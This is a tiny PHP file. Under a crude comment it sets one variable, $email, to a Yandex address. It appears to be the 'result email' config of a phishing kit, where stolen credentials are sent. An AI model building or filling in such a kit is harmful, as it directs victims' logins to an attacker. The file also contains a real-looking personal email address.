<?php

// Paste your fucking MAILS bro

$email = "imsrabon@yandex.com";
?>
